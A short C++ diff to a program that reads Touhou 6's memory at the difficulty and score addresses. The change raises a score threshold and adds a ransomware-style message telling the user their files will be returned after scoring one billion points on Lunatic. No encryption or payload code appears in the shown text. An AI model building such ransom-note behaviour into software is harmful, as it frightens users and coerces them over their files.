@@ -22,8 +22,10 @@ int main(int argc, char** argv)
 		"東方紅魔郷.exe",
 		0x0069BCB0, // Difficulty address is at -> 0x0069BCB0
 		0x0069BCA0, // Scoring points seem to be at a static address -> 0x0069BCA0
-		2000
+		10000000
 	};
+
+	std::cout << "You have been infected, play Touhou 6 on Lunatic and get 1 000 000 000pts to get your files back!" << std::endl;
 
 	MemorySniff sniff(&game);
 	sniff.sniff_process();
